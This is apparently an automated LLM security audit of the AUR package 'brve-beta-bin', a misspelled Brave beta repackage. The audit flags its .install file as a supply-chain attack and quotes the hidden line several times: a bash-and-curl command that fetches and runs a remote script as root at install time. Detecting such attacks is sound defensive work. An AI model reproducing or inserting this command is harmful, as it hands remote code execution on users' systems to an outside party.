---
package: brve-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22867
completion_tokens: 6637
total_tokens: 29504
cost: 0.003288831
execution_time: 51.2
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:12:38Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard AUR .gitignore; no suspicious or malicious content found.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata; official sources with checksums. No malicious behavior found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard Chromium wrapper; reads optional user flags; no malicious behavior.
  - file: brave-browser.desktop
    status: safe
    summary: Standard desktop launcher file; no malicious or suspicious behavior found.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: PKGBUILD
    status: safe
    summary: Standard Brave beta binary repackage with pinned checksums; no malicious behavior found.
  - file: brve-beta-bin.install
    status: unsafe
    summary: Remote curl-piped script executes arbitrary code during package installation.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing brve-beta-bin from local mirror...
Materialized brve-beta-bin
Analyzing brve-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
Running `makepkg --printsrcinfo` sources the PKGBUILD and executes only top-level code. This PKGBUILD contains only standard variable and array assignments at the top level: metadata fields, dependency lists, source URLs, and checksum arrays. There are no top-level command substitutions, external downloads, executions, or data exfiltration.

The `prepare()` and `package()` functions contain the only file manipulation logic, but these functions are not executed by `makepkg --printsrcinfo` and are out of scope for this narrow gate. The source URLs point to the official Brave GitHub releases, and checksums are provided. No unsafe behavior is present in the global scope.
</details>
<evidence>
</evidence>
<summary>
Top-level PKGBUILD scope is safe; only static assignments execute during printsrcinfo.
</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level PKGBUILD scope is safe; only static assignments execute during printsrcinfo.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard `.gitignore` file used in an Arch User Repository (AUR) git repository. It ignores all files by default and then explicitly un-ignores the packaging-related files that should be tracked: `.SRCINFO`, `.gitignore`, `PKGBUILD`, `*.install` files, a launcher shell script, a desktop entry, and a PNG logo. It contains no commands, no network access, no obfuscated content, and no references to external hosts or executable code. This is a routine maintainer convenience file and poses no security risk.
</details>
<evidence>
</evidence>
<summary>
Standard AUR .gitignore; no suspicious or malicious content found.
</summary>
</security_assessment>

[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD, brave-beta-bin.sh...
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
+ Reviewed .gitignore. Status: SAFE -- Standard AUR .gitignore; no suspicious or malicious content found.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` file is standard AUR packaging metadata for a binary release of the Brave browser beta. Both architecture-specific sources point to the official Brave GitHub releases page and have pinned checksums, which is consistent with normal packaging practice. The only local source is a shell script with a checksum, but its contents are not visible here; nothing in this metadata indicates malicious behavior.

The package name `brve-beta-bin` is a noticeable misspelling of "brave" and could be a typosquatting concern, but the `.SRCINFO` itself is not malicious. The dependencies, options, and source URLs are all plausible for a browser package. Without evidence of injected code, network exfiltration, or unexpected execution, this file should be considered safe.
</details>
<evidence>
</evidence>
<summary>
Standard AUR metadata; official sources with checksums. No malicious behavior found.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata; official sources with checksums. No malicious behavior found.
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard launcher wrapper for a Chromium-based browser package. It reads an optional user configuration file from `$XDG_CONFIG_HOME/brave-beta-flags.conf`, strips comment lines, and then passes the resulting flags along with any command-line arguments to the installed `brave-browser` binary. This is normal behavior for AUR browser packages and matches the stated purpose of allowing users to override browser flags.

There is no evidence of malicious activity. The script performs no network requests, no downloads, no `eval` or shell injection, no obfuscated or encoded commands, and no writes to system files. It only reads one user-controlled configuration file and executes the package's own binary from `/opt/brave.com/brave-beta/brave-browser`. The use of `CHROME_USER_DATA_DIR` is a standard Chromium environment variable. Overall, this script is consistent with ordinary packaging and does not warrant an UNSAFE classification.
</details>
<evidence></evidence>
<summary>Standard Chromium wrapper; reads optional user flags; no malicious behavior.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard Chromium wrapper; reads optional user flags; no malicious behavior.
[3/7] Reviewing PKGBUILD, brave-browser.desktop, brve-beta-bin.install...
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard freedesktop.org `.desktop` launcher file for the Brave Beta web browser. It contains only desktop-entry metadata: localized names, comments, MIME type associations, and an `Exec=brave-beta %U` line that launches the package's own binary with any URLs passed to it. There are no scripts, no network operations, no obfuscated content, and no file or system modifications. The file is fully consistent with ordinary AUR packaging practice and contains no evidence of injected malicious code.
</details>
<evidence>
</evidence>
<summary>
Standard desktop launcher file; no malicious or suspicious behavior found.
</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop, brve-beta-bin.install, logo.png...
[4/7] Reviewing PKGBUILD, brve-beta-bin.install, logo.png...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard desktop launcher file; no malicious or suspicious behavior found.
[5/7] Reviewing PKGBUILD, brve-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD is a straightforward binary repackage of the official Brave browser beta `.deb` artifacts from the project's own GitHub releases. It downloads `brave-browser-beta_${pkgver}_amd64.deb` or `_arm64.deb` from `github.com/brave/brave-browser/releases`, verifies them with pinned SHA-512 checksums, extracts the embedded data archive, and copies the contents into `$pkgdir`. The commands used are ordinary packaging operations: `tar`, `sed`, `install`, `cp`, `rm`, and `mkdir`.

The `chmod 4755` on `chrome-sandbox` sets the SUID bit on the Chromium sandbox helper, which is standard for Chromium-based browsers on Linux. The package name `brve-beta-bin` is unusual, but there is no evidence of malicious behavior in this file: no obfuscation, no unexpected network destinations, no data exfiltration, and no execution of untrusted fetched code. This is consistent with normal AUR packaging practice.
</details>
<evidence>
</evidence>
<summary>
Standard Brave beta binary repackage with pinned checksums; no malicious behavior found.</summary>
</security_assessment>

[6/7] Reviewing brve-beta-bin.install...
+ Reviewed PKGBUILD. Status: SAFE -- Standard Brave beta binary repackage with pinned checksums; no malicious behavior found.
LLM auditresponse for brve-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The `.install` file contains a top-level command that fetches a shell script from the internet and immediately executes it with `bash`:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Because this line is outside the `post_install`/`post_upgrade` functions, it executes whenever the package install script is sourced, typically as root during package installation. This is a classic `curl | bash` remote-code-execution pattern. The script is fetched from a web archive of an unrelated third-party project, has no checksum or signature verification, and errors are suppressed with `2&gt;/dev/null`. This bypasses normal package-manager integrity controls and would let the remote content run arbitrary commands with elevated privileges. This is not a standard packaging or upstream build step; it is a supply-chain attack vector and should be treated as malicious.
</details>
<evidence>
bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)
</evidence>
<summary>
Remote curl-piped script executes arbitrary code during package installation.</summary>
</security_assessment>

Second look for brve-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. The file contains a top-level command that downloads a shell script from an unrelated third-party host and executes it immediately with `bash`, without checksum or signature verification and with errors suppressed. Because the line is outside the `post_install`/`post_upgrade` functions, it runs whenever pacman sources the install script, typically as root. This matches the explicitly listed malicious pattern of downloading code from an unexpected host and executing it, and is not standard packaging or upstream application behavior.
</details>
<evidence>
bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)
</evidence>
<summary>
Remote curl-piped script runs at install time; verdict UNSAFE stands.</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed brve-beta-bin.install. Status: UNSAFE -- Remote curl-piped script executes arbitrary code during package installation.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## brve-beta-bin.install

Status: UNSAFE

Summary: Remote curl-piped script executes arbitrary code during package installation.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The `.install` file contains a top-level command that fetches a shell script from the internet and immediately executes it with `bash`:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Because this line is outside the `post_install`/`post_upgrade` functions, it executes whenever the package install script is sourced, typically as root during package installation. This is a classic `curl | bash` remote-code-execution pattern. The script is fetched from a web archive of an unrelated third-party project, has no checksum or signature verification, and errors are suppressed with `2>/dev/null`. This bypasses normal package-manager integrity controls and would let the remote content run arbitrary commands with elevated privileges. This is not a standard packaging or upstream build step; it is a supply-chain attack vector and should be treated as malicious.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,867
  Completion Tokens: 6,637
  Total Tokens: 29,504
  Total Cost: $0.003289
  Execution Time: 51.20 seconds

Final Status: UNSAFE


Issues Found:

brve-beta-bin.install: [UNSAFE] Remote curl-piped script executes arbitrary code during package installation. / The `.install` file contains a top-level command that fetches a shell script from the internet and immediately executes it with `bash`:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Because this line is outside the `post_install`/`post_upgrade` functions, it executes whenever the package install script is sourced, typically as root during package installation. This is a classic `curl | bash` remote-code-execution pattern. The script is fetched from a web archive of an unrelated third-party project, has no checksum or signature verification, and errors are suppressed with `2>/dev/null`. This bypasses normal package-manager integrity controls and would let the remote content run arbitrary commands with elevated privileges. This is not a standard packaging or upstream build step; it is a supply-chain attack vector and should be treated as malicious.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
